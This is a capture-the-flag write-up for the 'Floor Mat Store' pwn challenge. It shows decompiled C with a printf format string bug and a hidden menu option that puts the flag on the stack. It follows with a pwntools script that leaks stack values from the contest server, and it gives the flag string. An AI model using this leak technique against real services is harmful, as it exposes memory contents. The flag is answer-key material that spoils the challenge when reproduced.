# 1337UP LIVE CTF 2023

## Floor Mat Store

> Welcome to the Floor Mat store! It's kind of like heaven.. for mats
> 
> Author: CryptoCat
> 
> [`floormats`](floormats)

Tags: _pwn_

## Solution
For this challenge we get a binary we need to reverse first, to see how it can be exploited. `Ghidra` gives us the following code.

```c
undefined8 main(void)
{
  int iVar1;
  long in_FS_OFFSET;
  int local_128;
  int local_124;
  __gid_t local_120;
  int local_11c;
  char *local_118;
  FILE *local_110;
  char *local_108 [4];
  char *local_e8;
  char *local_e0;
  char local_d8 [64];
  char local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  local_108[0] = "1. Cozy Carpet Mat - $10";
  local_108[1] = "2. Wooden Plank Mat - $15";
  local_108[2] = "3. Fuzzy Shag Mat - $20";
  local_108[3] = "4. Rubberized Mat - $12";
  local_e8 = "5. Luxury Velvet Mat - $25";
  local_e0 = "6. Mysterious Flag Mat - $1337";
  local_118 = local_d8;
  local_120 = getegid();
  setresgid(local_120,local_120,local_120);
  local_110 = fopen("flag.txt","r");
  if (local_110 == (FILE *)0x0) {
    puts("You have a flag.txt, right??");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts(
      "Welcome to the Floor Mat store! It\'s kind of like heaven.. for mats.\n\nPlease choose from o ur currently available floor mats\n\nNote: Out of stock items have been temporarily delisted\n "
      );
  puts("Please select a floor mat:\n");
  for (local_124 = 0; local_124 < 5; local_124 = local_124 + 1) {
    puts(local_108[local_124]);
  }
  puts("\nEnter your choice:");
  __isoc99_scanf(&DAT_001021b6,&local_128);
  if ((0 < local_128) && (local_128 < 7)) {
    local_11c = local_128 + -1;
    do {
      iVar1 = getchar();
    } while (iVar1 != 10);
    if (local_11c == 5) {
      fgets(local_d8,0x40,local_110);
    }
    puts("\nPlease enter your shipping address:");
    fgets(local_98,0x80,stdin);
    puts("\nYour floor mat will be shipped to:\n");
    printf(local_98);
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return 0;
  }
  puts("Invalid choice!\n");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

There is an obvious `format string` issue we can use to leak data from the stack. Also there is a `hidden` menu option that copies the flag content to the stack. By combining this we can leak the flag.

```python
from pwn import *

for i in range(18, 30):
    #p = process("floormats")
    p = remote("floormats.ctf.intigriti.io", 1337)
    p.sendlineafter(b"floor mat:\n", b"6")
    x = f"%{i}$p"
    print(x, end="")
    p.sendlineafter(b"shipping address:", x.encode())
    p.recvuntil(b"shipped to:\n\n")
    data = p.recvall()[:-1]
    try:
        print(bytes.fromhex(data[2:].decode())[::-1])
    except:
        print("FAIL", data)
    p.close()

```

Flag `INTIGRITI{50_7h475_why_7h3y_w4rn_4b0u7_pr1n7f}`